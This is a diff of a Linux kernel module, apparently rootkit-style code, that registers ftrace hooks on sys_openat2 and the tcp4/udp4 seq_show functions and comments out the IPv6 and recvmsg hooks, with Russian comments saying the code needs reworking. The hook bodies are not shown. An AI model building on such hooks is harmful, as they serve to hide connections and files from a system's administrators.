@@ -9,7 +9,7 @@
 
 #include <linux/delay.h>		// msleep
 
-#include <net/inet_sock.h>
+#include <net/inet_sock.h>				// struct inet_sock
 #include <uapi/linux/uio.h>				// struct iovec
 #include <uapi/linux/netlink.h>			// struct nlmsghdr
 #include <uapi/linux/inet_diag.h>		// struct inet_diag_msg
@@ -69,20 +69,22 @@ static asmlinkage long ex_sys_openat2(struct pt_regs *regs);
 // static asmlinkage long (*real_sys_recvfrom)(struct pt_regs *regs);
 // static asmlinkage long ex_sys_recvfrom(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
-static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);
+// static asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
+// static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);
 
 static asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);
 
-static asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);
+// надо переделать код под них
+// static asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
+// static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);
 
 static asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);
 
-static asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
+// надо переделать код под них
+// static asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
+// static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
 // --------------------------------------------------------------------------------
 
 
@@ -118,11 +120,11 @@ static struct ftrace_hook EX_hooks[] = {
 	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),
 
 	// HOOK("sys_recvfrom", ex_sys_recvfrom, &real_sys_recvfrom),
-	SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
+	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
 	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
-	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
+	// HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
 	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
-	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
+	// HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
 };
 
 #endif
